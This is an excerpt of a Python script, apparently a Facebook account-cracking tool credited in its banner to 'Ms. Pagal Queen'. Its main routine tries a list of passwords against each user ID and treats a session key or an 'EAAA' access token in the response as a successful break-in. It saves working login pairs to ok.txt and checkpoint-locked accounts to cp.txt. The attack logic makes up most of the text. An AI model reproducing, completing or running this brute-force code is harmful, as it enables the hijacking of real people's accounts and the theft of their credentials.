...
logo = """
 ____   __    ___    __    __      _____  __  __  ____  ____  _  _ 
(  _ \ /__\  / __)  /__\  (  )    (  _  )(  )(  )( ___)( ___)( \( )
 )___//(__)\( (_-. /(__)\  )(__    )(_)(  )(__)(  )__)  )__)  )  ( 
(__) (__)(__)\___/(__)(__)(____)  (___/\\(______)(____)(____)(_)\_)
   \x1b[1;92m╔═════════════════════════════╗
   \x1b[1;92m║ TOOL NAME : { Ms. Pagal Queen}   ║
   \x1b[1;92m║ AUTHOR    : Ms . Pagal Queen     ║
   \x1b[1;92m║ GITHUB    : git.io/PAGAL ║
   \x1b[1;92m║ FACEBOOK  : Pagal Queen   ║
...
class Main:
	...
	def api(self, uid, pwx):
		...
		sys.stdout.write(
			"\r\r\033[92;1m WAIT AND SEE  [PAGAL QU33N]  ENJOY MY TOOLS "
		); sys.stdout.flush()
		for pw in pwx:
			pw = pw.lower()
			...
			if "session_key" in response.text and "EAAA" in response.text:
				print("\r  \033[0;92m   [QU33N-OK] %s | %s\033[0;97m         "%(uid, pw))
				self.ok.append("%s|%s"%(uid, pw))
				open("ok.txt","a").write("  * [QU33N]--> %s|%s\n"%(uid, pw))
				break
			elif "www.facebook.com" in response.json()["error_msg"]:
				print("\r  \033[0;91m   [QU33N-CP] %s | %s\033[0;97m         "%(uid, pw))
				self.cp.append("%s|%s"%(uid, pw))
				open("cp.txt","a").write("  * [QU33N]--> %s|%s\n"%(uid, pw))
				break
			else:
				continue
